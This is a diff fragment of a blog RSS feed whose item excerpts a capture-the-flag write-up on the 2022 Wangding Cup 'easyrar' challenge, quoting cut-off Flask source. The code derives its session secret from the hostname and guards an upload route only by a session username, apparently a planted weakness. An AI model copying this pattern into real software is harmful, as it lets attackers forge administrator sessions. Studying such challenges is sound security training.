+      <guid>http://localhost:1313/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/</guid>
+      <description>easyrar import os import re import yaml import time import socket import subprocess from hashlib import md5 from flask import Flask, render_template, make_response, send_file, request, redirect, session app = Flask(__name__) app.config[&amp;#39;SECRET_KEY&amp;#39;] = socket.gethostname() def response(content, status): resp = make_response(content, status) return resp @app.before_request def is_login(): if request.path == &amp;#34;/upload&amp;#34;: if session.get(&amp;#39;user&amp;#39;) != &amp;#34;Administrator&amp;#34;: return f&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;Access Denied&amp;#39;);window.location.href=&amp;#39;/&amp;#39;&amp;lt;/script&amp;gt;&amp;#34; else: return None @app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;]) def main(): if not session.get(&amp;#39;user&amp;#39;): session[&amp;#39;user&amp;#39;] = &amp;#39;Guest&amp;#39; try: return render_template(&amp;#39;index.</description>
+    </item>
+    
+  </channel>
+</rss>
